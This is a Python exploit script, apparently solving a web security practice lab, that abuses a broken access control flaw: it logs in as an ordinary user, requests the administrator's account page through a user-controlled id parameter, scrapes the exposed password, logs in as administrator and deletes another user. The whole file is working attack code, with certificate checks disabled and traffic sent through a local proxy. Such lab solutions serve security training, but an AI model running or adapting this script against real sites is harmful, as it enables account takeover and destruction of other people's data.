import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def get_csrf_token(s, url):
    login_url = url + "/login"
    r = s.get(login_url, verify=False, proxies=PROXIES)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", { 'name' : 'csrf'})['value']
    return csrf

def delete_carlos_user(s, url):

    # login by using regular user creds with csrf
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, url)
    login_data = { 'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter' }
    r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print('(+) User wiener login successful')

        # using userID= parameter to exploit its broken access control -> userId=administrator
        admin_account_url = url + "/my-account?id=administrator"
        r = s.get(admin_account_url, verify=False, proxies=PROXIES)
        res = r.text
        if "administrator" in res:
            print('(+) Admin account acces sucessful!')
            soup = BeautifulSoup(r.text, 'html.parser')
            extract_password = soup.find("input", { 'name' : 'password'})['value']

            # login  as adminstrator
            login_url = url + "/login"
            csrf_token = get_csrf_token(s, url)
            login_data = { 'csrf' : csrf_token, 'username' : 'administrator', 'password' : extract_password}
            r = s.post(login_url, data=login_data, verify=False, proxies=PROXIES)
            res = r.text
            if "Log out" in res:
                print('(+) Admin login sucessful!')

                # lest delete user carlos
                delete_url = url + "/admin/delete?username=carlos"
                r = s.get(delete_url, verify=False, proxies=PROXIES)
                if r.status_code == 200:
                    print('(+) Carlos user deleted sucessful!')
                    sys.exit(-1)
                else:
                    print('(+) Carlos user deleted failed.')
                    sys.exit(-1)
            else:
                print('(+) Admin login failed.')
                sys.exit(-1)
        else:
            print('(+) Admin account access failed.')
    else:
        print('(+) User wiener account access failed.')

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
    
    s = requests.Session()
    print('[*] Starting the Exploit : Broken Access Control - User ID controlled by request parameter with password disclosure')
    url = sys.argv[1].rstrip('/')
    delete_carlos_user(s, url)

if __name__ == "__main__":
    main()